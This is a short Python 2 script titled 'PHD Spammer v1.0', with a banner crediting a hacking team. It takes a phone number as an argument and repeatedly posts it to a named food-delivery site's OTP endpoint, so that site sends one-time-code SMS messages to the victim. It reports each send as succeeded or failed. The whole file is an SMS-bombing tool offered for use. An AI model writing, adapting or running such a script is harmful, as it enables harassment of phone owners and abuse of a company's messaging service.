## phd.py - PHD SPAM (19-March-2018 [08:34])
# -*- coding: utf-8 -*-
##
import sys
import time
import requests

__banner__ = """
 ___    _   _  ___    
(  _`\ ( ) ( )(  _`\  PHD Spammer v1.0
| |_) )| |_| || | ) | Author: DedSecTL
| ,__/'|  _  || | | | Codename: Alone.
| |    | | | || | | | Github: https://github.com/Gameye98
| |    | | | || |_) | Team  : BlackHole Security
(_)    (_) (_)(____/' Made with full of \033[1;31m<3\033[0m
"""

def spam():
	print __banner__
	param = {'phone_number':''+sys.argv[1]}
	count = 0
	while (count < 3):
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			print("\033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m")
		else:
			print("\033[1;31m[FAILED] Send Failed...Sleep for 1 second...\033[0m")
		time.sleep(1)
		count = count + 1
	print("\033[1;33m[ DONE ] Stopped...\033[0m")
	sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print __banner__
		print "Usage: phd.py PHONE"
		sys.exit(0)
	else:
		spam()